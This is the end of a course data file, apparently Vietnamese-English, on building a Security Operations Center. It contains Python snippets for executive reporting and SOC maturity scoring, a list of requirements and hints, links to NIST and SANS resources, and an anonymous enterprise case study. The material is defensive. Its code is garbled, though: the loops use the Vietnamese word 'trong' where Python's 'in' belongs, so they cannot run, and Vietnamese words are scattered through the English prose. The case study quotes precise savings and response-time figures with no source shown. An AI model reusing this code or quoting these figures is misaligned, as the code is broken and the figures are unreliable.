get_immediate_recommendations(),\n            \'strategic_improvements\': get_strategic_recommendations(),\n            \'budget_requests\': get_budget_recommendations()\n        }\n    }\n    \n    # Generate report\n    template = jinja2.Template(executive_report_template)\n    report_html = template.render(data=report_data)\n    \n    # Distribute report\n    send_email(\n        recipients=[\'ciso@corp.com\', \'ceo@corp.com\'],\n        subject=f\'SOC Executive Report - {timeperiod}\',\n        body=report_html,\n        format=\'html\'\n    )\n    \n    return report_data\n```\n\n## 7. Continuous Improvement Framework\n\n### SOC Maturity Assessment:\n```python\n# SOC Capability Maturity Model\ndef assess_soc_maturity():\n    capabilities = {\n        \'people\': {\n            \'staffing_levels\': assess_staffing(),\n            \'skill_levels\': assess_skills(),\n            \'training_program\': assess_training(),\n            \'retention_rate\': calculate_retention()\n        },\n        \'process\': {\n            \'documented_procedures\': assess_documentation(),\n            \'incident_response\': assess_ir_maturity(),\n            \'threat_hunting\': assess_hunting_maturity(),\n            \'metrics_program\': assess_metrics()\n        },\n        \'technology\': {\n            \'tool_integration\': assess_integration(),\n            \'automation_level\': assess_automation(),\n            \'data_quality\': assess_data_quality(),\n            \'scalability\': assess_scalability()\n        }\n    }\n    \n    # Calculate maturity scores\n    maturity_scores = {}\n    for category trong capabilities:\n        scores = [assess_capability(cap) for cap trong capabilities[category]]\n        maturity_scores[category] = sum(scores) / len(scores)\n    \n    overall_maturity = sum(maturity_scores.values()) / len(maturity_scores)\n    \n    return {\n        \'overall_score\': overall_maturity,\n        \'category_scores\': maturity_scores,\n        \'improvement_areas\': identify_gaps(maturity_scores),\n        \'recommendations\': generate_improvement_plan(maturity_scores)\n    }\n```\n\nThrough this comprehensive SOC implementation, organizations achieve advanced cybersecurity defense capabilities với measurable improvements trong threat detection, incident response, và overall security posture.',
        requirements: [
          'Enterprise SIEM platform access (Splunk/ELK)',
          'Threat intelligence platform setup (MISP)',
          'Incident response platform configuration',
          'Complete SOC operational procedures documentation',
          'Performance metrics dashboard implementation'
        ],
        hints: [
          'Start với core SIEM capabilities, expand gradually',
          'Focus on process automation to reduce analyst workload',
          'Integrate threat intelligence cho context enhancement',
          'Measure everything - metrics drive improvement'
        ],
        expectedOutput:
          'Fully operational Security Operations Center với automated threat detection, incident response capabilities, và comprehensive security monitoring'
      }
    ],
    realWorldApplications: [
      'Enterprise security operations center management',
      'Incident response team leadership và coordination',
      'Threat intelligence analysis và strategic planning',
      'Security architecture design và implementation',
      'Compliance và regulatory security requirements'
    ],
    resources: [
      {
        title: 'NIST Cybersecurity Framework',
        url: 'https://www.nist.gov/cyberframework',
        type: 'documentation',
        description:
          'Comprehensive cybersecurity framework for risk management và defense strategies'
      },
      {
        title: 'SANS Incident Response Process',
        url: 'https://www.sans.org/white-papers/901/',
        type: 'documentation',
        description:
          'Industry-standard incident response methodologies và best practices'
      }
    ],
    caseStudies: [
      {
        title: 'Global Enterprise SOC Transformation',
        organization: 'Fortune 100 Technology Company',
        challenge:
          'Transform legacy security operations into modern SOC capability, reducing 10,000+ daily alerts to manageable levels while improving detection accuracy và response times across 50+ global locations.',
        solution:
          'Implemented next-generation SIEM với AI/ML analytics, deployed SOAR platform với 200+ automated playbooks, established threat hunting program, và created integrated threat intelligence platform. Reduced analyst workload through 80% automation.',
        results:
          'Achieved 65% reduction trong false positives, improved MTTD from 4 hours to 12 minutes, reduced MTTR from 24 hours to 2 hours. Prevented $50M+ trong potential damages through early threat detection. SOC became industry benchmark for operational excellence.',
        insights: [
          'Automation critical for handling enterprise-scale security operations',
          'Threat intelligence integration dramatically improves detection accuracy',
          'Continuous analyst training essential for advanced threat hunting',
          'Metrics-driven improvement creates sustainable operational excellence'
        ]
      }
    ]
  }
];
